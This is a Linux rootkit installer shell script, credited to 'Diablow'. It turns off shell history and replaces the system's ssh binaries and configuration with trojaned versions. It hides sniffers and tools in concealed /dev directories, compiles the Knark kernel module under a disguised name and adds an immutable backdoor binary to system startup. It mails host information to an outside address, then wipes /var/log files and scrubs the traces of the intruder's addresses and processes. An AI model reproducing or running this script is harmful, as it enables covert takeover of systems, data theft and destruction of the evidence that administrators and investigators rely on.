#!/bin/sh
export HISTFILE=/dev/null
unset _
echo -en "\\033[32m" #print a gren banner
echo "*********************************"
echo "********* RooTKit 5.0. **********"
echo "********** Install Kit **********"
echo "******* (C) by Diablow **********"
echo "*********************************"
echo -en "\\033[39m" #back to normal color

echo "Installing ssh kit"
tar zxvf ssh.tgz
cd ssh
mv -f ssh-add /usr/bin/ &>/dev/null
mv -f ssh-agent /usr/bin/ &>/dev/null
mv -f ssh-keygen /usr/bin/ &>/dev/null
mv -f initd /usr/sbin/ &>/dev/null
mv -f ssh_host_key /etc/ssh_host_key &>/dev/null
mv -f sshd_config /etc/sshd_config   &>/dev/null
mv -f shhk /usr/sbin/shhk  &>/dev/null
mv -f shrs /usr/sbin/shrs  &>/dev/null
cd ..
rm -f ssh.tgz

echo "Done with ssh .."
echo "Preparing the shell...checking some system files..."

echo -n "Moving up the /dev filez... "

echo "Creating home... "
mkdir -p /dev/ida/.sys
mkdir -p /dev/raw/.doz
echo "Copying Ssh and the rest..."
mv -f knark.tgz hexa /dev/ida/.sys/
mv snuff /dev/ida/.sys/
mv snuff.c /dev/ida/.sys/
mv sniffchk /dev/ida/.sys/
mv -f hexa /dev/ida/.sys/
mv clean /dev/ida/.sys/
mv slice /dev/ida/.sys/
mv vadim /dev/ida/.sys/
mv ryan /dev/raw/.doz/
mv -f sysinfo /dev/ida/.sys
echo "/usr/bin/ishit -t1 -X53 -p" >> /etc/rc.d/rc.sysinit
echo >> /etc/rc.d/rc.sysinit
mv ishit -f /usr/bin/
chmod 500 /usr/bin/ishit
chattr +i /usr/bin/ishit
rm -f install README

cd ..
rm -rf gold
rm -f gold.tgz


sleep 1

echo "Compiling Knark and then Adore...."
cd /dev/ida/.sys
tar zxvf knark.tgz
cd knark
make
mv knark.o atapi.o
cp atapi.o /lib/modules/atapi.o
cp atapi.o /dev/ida/.sys/knark
echo "Done.."
/usr/bin/ishit

sleep 1

/dev/ida/.sys/sysinfo |mail -s "$(uname -a)" killthedick@yahoo.com

echo " Done! Mailing results ... Please wait ..."
sleep 1
echo "Last part:removing you from logs ..."

echo >/var/log/messages
echo >/var/log/boot.log
echo >/var/log/cron
echo >/var/log/secure
echo >/var/log/maillog

/dev/ida/.sys/cleaner yahoo.com         > /dev/null 2> /dev/null 	
/dev/ida/.sys/cleaner sshd              > /dev/null 2> /dev/null
/dev/ida/.sys/cleaner root              > /dev/null 2> /dev/null
/dev/ida/.sys/cleaner poisonbotx.com    > /dev/null 2> /dev/null
/dev/ida/.sys/cleaner promisc           > /dev/null 2> /dev/null
/dev/ida/.sys/cleaner null              > /dev/null 2> /dev/null
/dev/ida/.sys/cleaner statd             > /dev/null 2> /dev/null
/dev/ida/.sys/cleaner 217.10            > /dev/null 2> /dev/null
/dev/ida/.sys/cleaner 213.233           > /dev/null 2> /dev/null
/dev/ida/.sys/cleaner xnet.ro           > /dev/null 2> /dev/null
/dev/ida/.sys/cleaner xinetd            > /dev/null 2> /dev/null
/dev/ida/.sys/cleaner insmod            > /dev/null 2> /dev/null
/dev/ida/.sys/cleaner lpd               > /dev/null 2> /dev/null
/dev/ida/.sys/cleaner 50megs.com        > /dev/null 2> /dev/null
/dev/ida/.sys/cleaner ryan              > /dev/null 2> /dev/null
/dev/ida/.sys/cleaner cron              > /dev/null 2> /dev/null
/dev/ida/.sys/cleaner passwd            > /dev/null 2> /dev/null
/dev/ida/.sys/cleaner ftp               > /dev/null 2> /dev/null
/dev/ida/.sys/cleaner daemon            > /dev/null 2> /dev/null


echo "All instaled"
echo
echo "Way to go , shit!...."
